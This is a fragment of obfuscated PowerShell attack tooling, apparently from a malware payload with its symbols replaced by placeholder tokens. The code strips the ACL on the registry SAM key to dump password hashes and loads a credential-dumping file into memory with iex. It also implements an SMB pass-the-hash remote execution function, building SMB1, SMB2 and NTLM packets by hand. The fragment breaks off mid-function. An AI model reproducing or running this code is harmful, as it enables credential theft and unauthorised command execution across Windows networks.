        wB69acl = wB69key.GetAccessControl()

        wB69acl.SetAccessRule(wB69rule)

        wB69key.SetAccessControl(wB69acl)


        DumpHashes


        wB69user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        wB69acl.Access uOva where {wB69_.IdentityReference.Value -eq wB69user} uOva %{wB69acl.RemoveAccessRule(wB69_)} uOva Out-Null

        Set-Acl HKLM:9e0SAM9e0SAM9e0Domains wB69acl


    }

}


function Invoke-Mypass {

    iex(-join[char[]][System.IO.File]::ReadAllBytes(wB69mimipath))

    invoke-Udyeijdyqid

}


function Invoke-SE

{

[CmdletBinding(DefaultParametersetName=utH9DefaultutH9)]

param

(

    [parameter(Mandatory=wB69false)][String]wB69Target,

    [parameter(ParameterSetName=utH9AuthutH9,Mandatory=wB69true)][String]wB69Username,

    [parameter(ParameterSetName=utH9AuthutH9,Mandatory=wB69false)][String]wB69Domain,

    [parameter(Mandatory=wB69false)][String]wB69Command,

    [parameter(Mandatory=wB69false)][ValidateSet(NDckYNDck,NDckNNDck)][String]wB69CommandCOMSPEC=NDckYNDck,

    [parameter(ParameterSetName=utH9AuthutH9,Mandatory=wB69true)][ValidateScript({wB69_.Length -eq 32 -or wB69_.Length -eq 65})][String]wB69Hash,

    [parameter(Mandatory=wB69false)][String]wB69Service,

    [parameter(Mandatory=wB69false)][ValidateSet(NDckAutoNDck,NDck1NDck,NDck2.1NDck)][String]wB69Version=NDckAutoNDck,

    [parameter(ParameterSetName=utH9SessionutH9,Mandatory=wB69false)][Int]wB69Session,

    [parameter(ParameterSetName=utH9SessionutH9,Mandatory=wB69false)][Switch]wB69Logoff,

    [parameter(ParameterSetName=utH9SessionutH9,Mandatory=wB69false)][Switch]wB69Refresh,

    [parameter(Mandatory=wB69false)][Int]wB69Sleep=150

)


if(wB69PsCmdlet.ParameterSetName -ne utH9SessionutH9 -and !wB69Target)

{

    Write-Output NDck[-] Target is required when not using -SessionNDck

    throw

}


if(wB69Command)

{

    wB69SMB_execute = wB69true

}


if(wB69Version -eq utH91utH9)

{

    wB69SMB_version = utH9SMB1utH9

}

elseif(wB69Version -eq utH92.1utH9)

{

    wB69SMB_version = utH9SMB2.1utH9

}


if(wB69PsCmdlet.ParameterSetName -ne utH9AuthutH9 -and wB69PsCmdlet.ParameterSetName -ne utH9SessionutH9)

{

    wB69signing_check = wB69true

}


function ConvertFrom-PacketOrderedDictionary

{

    param(wB69OrderedDictionary)


    ForEach(wB69field in wB69OrderedDictionary.Values)

    {

        wB69byte_array += wB69field

    }


    return wB69byte_array

}


#NetBIOS


function New-PacketNetBIOSSessionService

{

    param([Int]wB69HeaderLength,[Int]wB69DataLength)


    [Byte[]]wB69length = ([System.BitConverter]::GetBytes(wB69HeaderLength + wB69DataLength))[2..0]


    wB69NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary

    wB69NetBIOSSessionService.Add(NDckMessageTypeNDck,[Byte[]](0x00))

    wB69NetBIOSSessionService.Add(NDckLengthNDck,wB69length)


    return wB69NetBIOSSessionService

}


#SMB1


function New-PacketSMBHeader

{

    param([Byte[]]wB69Command,[Byte[]]wB69Flags,[Byte[]]wB69Flags2,[Byte[]]wB69TreeID,[Byte[]]wB69ProcessID,[Byte[]]wB69UserID)


    wB69ProcessID = wB69ProcessID[0,1]


    wB69SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBHeader.Add(NDckProtocolNDck,[Byte[]](0xff,0x53,0x4d,0x42))

    wB69SMBHeader.Add(NDckCommandNDck,wB69Command)

    wB69SMBHeader.Add(NDckErrorClassNDck,[Byte[]](0x00))

    wB69SMBHeader.Add(NDckReservedNDck,[Byte[]](0x00))

    wB69SMBHeader.Add(NDckErrorCodeNDck,[Byte[]](0x00,0x00))

    wB69SMBHeader.Add(NDckFlagsNDck,wB69Flags)

    wB69SMBHeader.Add(NDckFlags2NDck,wB69Flags2)

    wB69SMBHeader.Add(NDckProcessIDHighNDck,[Byte[]](0x00,0x00))

    wB69SMBHeader.Add(NDckSignatureNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMBHeader.Add(NDckReserved2NDck,[Byte[]](0x00,0x00))

    wB69SMBHeader.Add(NDckTreeIDNDck,wB69TreeID)

    wB69SMBHeader.Add(NDckProcessIDNDck,wB69ProcessID)

    wB69SMBHeader.Add(NDckUserIDNDck,wB69UserID)

    wB69SMBHeader.Add(NDckMultiplexIDNDck,[Byte[]](0x00,0x00))


    return wB69SMBHeader

}

function New-PacketSMBNegotiateProtocolRequest

{

    param([String]wB69Version)


    if(wB69Version -eq utH9SMB1utH9)

    {

        [Byte[]]wB69byte_count = 0x0c,0x00

    }

    else

    {

        [Byte[]]wB69byte_count = 0x22,0x00  

    }


    wB69SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBNegotiateProtocolRequest.Add(NDckWordCountNDck,[Byte[]](0x00))

    wB69SMBNegotiateProtocolRequest.Add(NDckByteCountNDck,wB69byte_count)

    wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_BufferFormatNDck,[Byte[]](0x02))

    wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_NameNDck,[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))


    if(wB69version -ne utH9SMB1utH9)

    {

        wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_BufferFormat2NDck,[Byte[]](0x02))

        wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_Name2NDck,[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))

        wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_BufferFormat3NDck,[Byte[]](0x02))

        wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_'+'Name3NDck,[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))

    }


    return wB69SMBNegotiateProtocolRequest

}


function New-PacketSMBSessionSetupAndXRequest

{

    param([Byte[]]wB69SecurityBlob)


    [Byte[]]wB69byte_count = [System.BitConverter]::GetBytes(wB69SecurityBlob.Length)[0,1]

    [Byte[]]wB69security_bl'+'ob_length = [System.BitConverter]::GetBytes(wB69SecurityBlob.Length + 5)[0,1]


    wB69SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBSessionSetupAndXRequest.Add(NDckWordCountNDck,[Byte[]](0x0c))

    wB69SMBSessionSetupAndXRequest.Add(NDckAndXCommandNDck,[Byte[]](0xff))

    wB69SMBSessionSetupAndXRequest.Add(NDckReservedNDck,[Byte[]](0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckAndXOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckMaxBufferNDck,[Byte[]](0xff,0xff))

    wB69SMBSessionSetupAndXRequest.Add(NDckMaxMpxCountNDck'+',['+'Byte[]](0x02,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckVCNumberNDck,[Byte[]](0x01,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckSessionKeyNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckSecurityBlobLengthNDck,wB69byte_count)

    wB69SMBSessionSetupAndXRequest.Add(NDckReserved2NDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckCapabilitiesNDck,[Byte[]](0x44,0x00,0x00,0x80))

    wB69SMBSessionSetupAndXRequest.Add(NDckByteCountNDck,wB69security_blob_length)

    wB69SMBSessionSetupAndXRequest.Add(NDckSecurityBlobNDck,wB69SecurityBlob)

    wB69SMBSessionSetupAndXRequest.Add(NDckNativeOSNDck,[Byte[]](0x00,0x00,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckNativeLANManageNDck,[Byte[]](0x00,0x00))


    return wB69SMBSessionSetupAndXRequest 

}


function New-PacketSMBTreeConnectAndXRequest

{

    param([Byte[]]wB69Path)


    [Byte[]]wB69path_length = wB69([System.BitConverter]::GetBytes(wB69Path.Length + 7))[0,1]


    wB69SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBTreeConnectAndXRequest.Add(NDckWordCountNDck,[Byte[]](0x04))

    wB69SMBTreeConnectAndXRequest.Add(NDckAndXCommand'+'NDck,[Byte[]](0xff))

    wB69SMBTreeConnectAndXRequest.Add(NDckReservedNDck,[Byte[]](0x00))

    wB69SMBTreeConnectAndXRequest.Add(NDckAndXOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMBTreeConnectAndXRequest.Add(NDckFlagsNDck,[Byte[]](0x00,0x00))

    wB69SMBTreeConnectAndXRequest.Add(NDckPasswordLengthNDck,[Byte[]](0x01,0x00))

    wB69SMBTreeConnectAndXRequest.Add(NDckByteCountNDck,wB69path_length)

    wB69SMBTreeConnectAndXRequest.Add(NDckPasswordNDck,[Byte[]](0x00))

    wB69SMBTreeConnectAndXRequest.Add(NDckTreeNDck,wB69Path)

    wB69SMBTreeConnectAndXRequest.Add(NDckServiceNDck,[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))


    return wB69SMBTreeConnectAndXRequest

}


function New-PacketSMBNTCreateAndXRequest

{

    param([Byte[]]wB'+'69NamedPipe)


    [Byte[]]wB69named_pipe_length = wB69([System.BitConverter]::GetBytes(wB69NamedPipe.Length))[0,1]

    [Byte[]]wB69file_name_length = wB69([System.BitConverter]::GetBytes(wB69NamedPipe.Length - 1))[0,1]


    wB69SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBNTCreateAndXRequest.Add(NDckWordCountNDck,[Byte[]](0x18))

    w'+'B69SMBNTCreateAndXRequest.Add(NDckAndXCommandNDck,[Byte[]](0xff))

    wB69SMBNTCreateAndXRequest.Add(NDckReservedNDck,[Byte[]](0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckAndXOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckReserved2NDck,[Byte[]](0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckFileNameLenNDck,wB69file_name_length)

    wB69SMBNTCreateAndXRequest.Add(NDckCreateFlagsNDck,[Byte[]](0x16,0x00,0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckRootFIDNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckAccessMaskNDck,[Byte[]](0x00,0x00,0x00,0x02))

    wB69SMBNTCreateAndXRequest.Add(NDckAllocationSizeNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckFileAttributesNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckShareAccessNDck,[Byte[]](0x07,0x00,0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckDispositionNDck,[Byte[]](0x01,0x00,0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckCreateOptionsNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckImpersonationNDck,[Byte[]](0x02,0x00,0x00,0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckSecurityFlagsNDck,[Byte[]](0x00))

    wB69SMBNTCreateAndXRequest.Add(NDckByteCountNDck,wB69named_pipe_length)

    wB69SMBNTCreateAndXRequest.Add(NDckFilenameNDck,wB69NamedPipe)


    return wB69SMBNTCreateAndXRequest

}


function New-PacketSMBReadAndXRequest

{

    wB69SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBReadAndXRequest.Add(NDckWordCountNDck,[Byte[]](0x0a))

    wB69SMBReadAndXRequest.Add(NDckAndXCommandNDck,[Byte[]](0xff))

    wB69SMBReadAndXRequest.Add(NDckReservedNDck,[Byte[]](0x00))

    wB69SMBReadAndXRequest.Add(NDckAndXOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMBReadAndXRequest.Add(NDckFIDNDck,[Byte[]](0x00,0x40))

   '+' wB69SMBReadAndXRequest.Add(NDckOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBReadAndXRequest.Add(NDckMaxCountLowNDck,[Byte[]](0x58,0x02))

    wB69SMBReadAndXRequest.Add(NDckMinCountNDck,[Byte[]](0x58,0x02))

    wB69SMBReadAndXRequest.Add(NDckUnknownNDck,[Byte[]](0xff,0xff,0xff,0xff))

    wB69SMBReadAndXRequest.Add(NDckRemainingNDck,[Byte[]](0x00,0x00))

    wB69SMBReadAndXRequest.Add(NDckByteCountNDck,[Byte[]](0x00,0x00))


    return wB69SMBReadAndXRequest

}


function New-PacketSMBWriteAndXRequest

{

    param([Byte[]]wB69FileID,[Int]wB69Length)


    [Byte[]]wB69write_length = [System.BitConverter]::GetBytes(wB69Length)[0,1]


    wB69SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBWriteAndXRequest.Add(NDckWordCountNDck,[Byte[]](0x0e))

    wB69SMBWriteAndXRequest.Add(NDckAndXCommandNDck,[Byte[]](0xff))

    wB69SMBWriteAndXRequest.Add('+'NDckReservedNDck,[Byte[]](0x00))

    wB69SMBWriteAndXRequest.Add(NDckAndXOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMBWriteAndXRequest.Add(NDckFIDNDck,wB69FileID)

    wB69SMBWriteAndXRequest.Add(NDckOffsetNDck,[Byte[]](0xea,0x03,0x00,0x00))

    wB69SMBWriteAndXRequest.Add(NDckReserved2NDck,[Byte[]](0xff,0xff,0xff,0xff))

    wB69SMBWriteAndXRequest.Add(NDckWriteModeNDck,[Byte[]](0x08,0x00))

    wB69SMBWriteAndXRequest.Add(NDckRemainingNDck,wB69write_length)

    wB69SMBWriteAndXRequest.Add(NDckDataLengthHighNDck,[Byte[]](0x00,0x00))

    wB69SMBWriteAndXRequest.Add(NDckDataLengthLowNDck,wB69write_length)

    wB69SMBWriteAndXRequest.Add(NDckDataOffsetNDck,[Byte[]](0x3f,0x00))

    wB69SMBWriteAndXRequest.Add(NDckHighOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBWriteAndXRequest.Add(NDckByteCountNDck,wB69write_length)


    return wB69SMBWriteAndXRequest

}


function New-PacketSMBCloseRequest

{

    param ([Byte[]]wB69FileID)


    wB69SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBCloseRequest.Add(NDckWordCountNDck,[Byte[]](0x03))

    wB69SMBCloseRequest.Add(NDckFIDNDck,wB69FileID)

    wB69SMBCloseRequest.Add(NDckLastWriteNDck,[Byte[]](0xff,0xff,0xff,0xff))

    wB69SMBCloseRequest.Add(NDckByteCountNDck,[Byte[]](0x00,0x00))


    return wB69SMBCloseRequest

}


function New-PacketSMBTreeDisconnectRequest

{

    wB69SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBTreeDisconnectRequest.Add(NDckWordCountNDck,[Byte[]](0x00))

    wB69SMBTreeDisconnectRequest.Add(NDckByteCountNDck,[Byte[]](0x00,0x00))


    return wB69SMBTreeDisconnectRequest

}


function New-PacketSMBLogoffAndXRequest

{

    wB69SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBLogoffAndXRequest.Add(NDckWordCountNDck,[Byte[]](0x02))

    wB69SMBLogoffAndXRequest.Add(NDckAndXCommandNDck,[Byte[]](0xff))

    wB69SMBLogoffAndXRequest.Add(NDckReservedNDck,[Byte[]](0x00))

    wB69SMBLogoffAndXRequest.Add(NDckAndXOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMBLogoffAndXRequest.Add(NDckByteCountNDck,[Byte[]](0x00,0x00))


    return wB69SMBLogoffAndXRequest

}


#SMB2


function New-PacketSMB2Header

{

    param([Byte[]]wB69Command,[Byte[]]wB69CreditRequest,[Bool]wB69Signing,[Int]wB69MessageID,[Byte[]]wB69ProcessID,[Byte[]]wB69TreeID,[Byte[]]wB69SessionID)


    if(wB69Signing)

    {

        wB69flags = 0x08,0x00,0x00,0x00      

    }

    else

    {

        wB69flags = 0x00,0x00,0x00,0x00

    }


    [Byte[]]wB69message_ID = [System.BitConverter]::GetBytes(wB69MessageID)


    if(wB69message_ID.Length -eq 4)

    {

        wB69message_ID += 0x00,0x00,0x00,0x00

    }


    wB69SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2Header.Add(NDckProtocolIDNDck,[Byte[]](0xfe,0x53,0x4d,0x42))

    wB69SMB2Header.Add(NDckStructureSizeNDck,[Byte[]](0x40,0x00))

    wB69SMB2Header.Add(NDckCreditChargeNDck,[Byte[]](0x01,0x00))

    wB69SMB2Header.Add(NDckChannelSequenceNDck,[Byte[]](0x00,0x00))

    wB69SMB2Header.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69SMB2Header.Add(NDckCommandNDck,wB69Command)

    wB69SMB2Header.Add(NDckCreditRequestNDck,wB69CreditRequest)

    wB69SMB2Header.Add(NDckFlagsNDck,wB69flags)

    wB69SMB2Header.Add(NDckNextCommandNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2Header.Add(NDckMessageIDNDck,wB69message_ID)

    wB69SMB2Header.Add(NDckProcessIDNDck,wB69ProcessID)

    wB69SMB2Header.Add(NDckTreeIDNDck,wB69TreeID)

    wB69SMB2Header.Add(NDckSessionIDNDck,wB69SessionID)

    wB69SMB2Header.Add(NDckSignatureNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))


    return wB69SMB2Header

}


function New-PacketSMB2NegotiateProtocolRequest

{

    wB69SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2NegotiateProtocolRequest.Add(NDckStructureSizeNDck,[Byte[]](0x24,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckDialectCountNDck,[Byte[]](0x02,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckSecurityModeNDck,[Byte[]](0x01,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckCapabilitiesNDck,[Byte[]](0x40,0x00,0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckClientGUIDNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckNegotiateContextOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckNegotiateContextCountNDck,[Byte[]](0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckReserved2NDck,[Byte[]](0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckDialectNDck,[Byte[]](0x02,0x02))

    wB69SMB2NegotiateProtocolRequest.Add(NDckDialect2NDck,[Byte[]](0x10,0x02))


    return wB69SMB2NegotiateProtocolRequest

}


function New-PacketSMB2SessionSetupRequest

{

    param([Byte[]]wB69SecurityBlob)


    [Byte[]]wB69security_buffer_length = ([System.BitConverter]::GetBytes(wB69SecurityBlob.Length))[0,1]


    wB69SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2SessionSetupRequest.Add(NDckStructureSizeNDck,[Byte[]](0x19,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckFlagsNDck,[Byte[]](0x00))

    wB69SMB2SessionSetupRequest.Add(NDckSecurityModeNDck,[Byte[]](0x01))

    wB69SMB2SessionSetupRequest.Add(NDckCapabilitiesNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckChannelNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckSecurityBufferOffsetNDck,[Byte[]](0x58,0x00))

    wB69SMB2SessionSetup'+'Request.Add(NDckSecurityBufferLengthNDck,wB69security_buffer_length)

    wB69SMB2SessionSetupRequest.Add(NDckPreviousSessionIDNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckBufferNDck,wB69SecurityB'+'lob)


    return wB69SMB2SessionSetupRequest 

}


function New-PacketSMB2TreeConnectRequest

{

    param([Byte[]]wB69Buffer)


    [Byte[]]wB69path_length = ([System.BitConverter]::GetBytes(wB69Buffer.Length))[0,1]


    wB69SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2TreeConnectRequest.Add(NDckStructureSizeNDck,[Byte[]](0x09,0x00))

    wB69SMB2TreeConnectRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69SMB2TreeConnectRequest.Add(NDckPathOffsetNDck,[Byte[]](0x48,0x00))

    wB69SMB2TreeConnectRequest.Add(NDckPathLengthNDck,wB69path_length)

    wB69SMB2TreeConnectRequest.Add(NDckBufferNDck,wB69Buffer)


   '+' return wB69SMB2TreeConnectRequest

}


function New-PacketSMB2CreateRequestFile

{

    param([Byte[]]wB69NamedPipe)


    wB69name_length = ([System.BitConverter]::GetBytes(wB69NamedPipe.Length))[0,1]


    wB69SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2CreateRequestFile.Add(NDckStructureSizeNDck,[Byte[]](0x39,0x00))

    wB69SMB2CreateRequestFile.Add(NDckFlagsNDck,[Byte[]](0x00))

    wB69SMB2CreateRequestFile.Add(NDckRequestedOplockLevelNDck,[Byte[]](0x00))

    wB69SMB2CreateRequestFile.Add(NDckImpersonationNDck,[Byte[]](0x02,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckSMBCreateFlagsNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckReservedNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckDesiredAccessNDck,[Byte[]](0x03,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckFileAttributesNDck,[Byte[]](0x80,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckShareAccessNDck,[Byte[]](0x01,0x00,0x00,0x00))

    wB69SMB2Create'+'RequestFile.Add(NDckCreateDispositionNDck,[Byte[]](0x01,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckCreateOptionsNDck,[Byte[]](0x40,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckNameOffsetNDck,[Byte[]](0x78,0x00))

    wB69SMB2CreateRequestFile.Add(NDckNameLengthNDck,wB69name_length)

    wB69SMB2CreateRequestFile.Add(NDckCreateContextsOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckCreateContextsLengthNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2CreateRequestFile.Add(NDckBufferNDck,wB69NamedPipe)


    return wB69SMB2CreateRequestFile

}


function New-PacketSMB2ReadRequest

{

    param ([Byte[]]wB69FileID)


    wB69SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2ReadRequest.Add(NDckStructureSizeNDck,[Byte[]](0x31,0x00))

    wB69SMB2ReadRequest.Add(NDckPaddingNDck,[Byte[]](0x50))

    wB69SMB2ReadRequest.Add(NDckFlagsNDck,[Byte[]](0x00))

    wB69SMB2ReadRequest.Add(NDckLengthNDck,[Byte[]](0x00,0x00,0x10,0x00))

    wB69SMB2ReadRequest.Add(NDckOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckFileIDNDck,wB69FileID)

    wB69SMB2ReadRequest.Add(NDckMinimumCountNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckChannelNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckRemainingBytesNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckReadChannelInfoOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckReadChannelInfoLengthNDck,[Byte[]](0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckBufferNDck,[Byte[]](0x30))


    return wB69SMB2ReadRequest

}


function New-PacketSMB2WriteRequest

{

    param([Byte[]]wB69FileID,[Int]wB69RPCLength)


    [Byte[]]wB69write_length = [System.BitConverter]::GetBytes(wB69RPCLength)


    wB69SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2WriteRequest.Add(NDckStructureSizeNDck,[Byte[]](0x31,0x00))

    wB69SMB2WriteRequest.Add(NDckDataOffsetNDck,[Byte[]](0x70,0x00))

    wB69SMB2WriteRequest.Add(NDckLengthNDck,wB69write_length)

    wB69SMB2WriteRequest.Add(NDckOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckFileIDNDck,wB69FileID)

    wB69SMB2WriteRequest.Add(NDckChannelNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckRemainingBytesNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckWriteChannelInfoOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckWriteChannelInfoLengthNDck,[Byte[]](0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckFlagsNDck,[Byte[]](0x00,0x00,0x00,0x00))


    return wB69SMB2WriteRequest

}


function New-PacketSMB2CloseRequest

{

    param ([Byte[]]wB69FileID)


    wB69SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2CloseRequest.Add(NDckStructureSizeNDck,[Byte[]](0x18,0x00))

    wB69SMB2CloseRequest.Add(NDckFlagsNDck,[Byte[]](0x00,0x00))

    wB69SMB2CloseRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2CloseRequest.Add(NDckFileIDNDck,wB69FileID)


    return wB69SMB2CloseRequest

}


function New-PacketSMB2TreeDisconnectRequest

{

    wB69SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2TreeDisconnectRequest.Add(NDckStructureSizeNDck,[Byte[]](0x04,0x00))

    wB69SMB2TreeDisconnectRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))


    return wB69SMB2TreeDisconnectRequest

}


function New-PacketSMB2SessionLogoffRequest

{

    wB69SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2SessionLogoffRequest.Add(NDckStructureSizeNDck,[Byte[]](0x04,0x00))

    wB69SMB2SessionLogoffRequest.Add(NDck'+'ReservedNDck,[Byte[]](0x00,0x00))


    return wB69SMB2SessionLogoffRequest

}


#NTLM


function New-PacketNTLMSSPNegotiate

{

    param([Byte[]]wB69NegotiateFlags,[Byte[]]wB69Version)


    [Byte[]]wB69NTLMSSP_length = ([System.BitConverter]::GetBytes(wB69Version.Length + 32))[0]

    [Byte[]]wB69ASN_length_1 = wB69NTLMSSP_length[0] + 32

    [Byte[]]wB69ASN_length_2 = wB69NTLMSSP_length[0] + 22

    [Byte[]]wB69ASN_length_3 = wB69NTLMSSP_length[0] + 20

    [Byte[]]wB69ASN_length_4 = wB69NTLMSSP_length[0] + 2


    wB69NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary

    wB69NTLMSSPNegotiate.Add(NDckInitialContextTokenIDNDck,[Byte[]](0x60))

    wB69NTLMSS'+'PNegotiate.Add(NDckInitialcontextTokenLengthNDck,wB69ASN_length_1)

    wB69NTLMSSPNegotiate.Add(NDckThisMechIDNDck,[Byte[]](0x06))

    wB69NTLMSSPNegotiate.Add(NDckThisMechLengthNDck,[Byte[]](0x06))

    wB69NTLMSSPNegotiate.Add(NDckOIDNDck,[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))

    wB69NTLMSSPNegotiate.Add(NDckInnerContextTokenIDNDck,[Byte[]](0xa0))

    wB69NTLMSSPNegotiate.Add(NDckInnerContextTokenLengthNDck,wB69ASN_length_2)

    wB69NTLMSSPNegotiate.Add(NDckInnerContextTokenID2NDck,[Byte[]](0x30))

    wB69NTLMSSPNegotiate.Add(NDckInnerContextTokenLength2NDck,wB69ASN_length_3)

    wB69NTLMSSPNegotiate.Add(NDckMechTypesIDNDck,[Byte[]](0xa0))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesLengthNDck,[Byte[]](0x0e))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesID2NDck,[Byte[]](0x30))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesLength2NDck,[Byte[]](0x0c))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesID3NDck,[Byte[]](0x06))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesLength3NDck,[Byte[]](0x0a))

    wB69NTLMSSPNegotiate.Add(NDckMechTypeNDck,[Byte[]](0x2b,0x06,0x01,0x04,0x01,'+'0x82,0x37,0x02,0x02,0x0a))

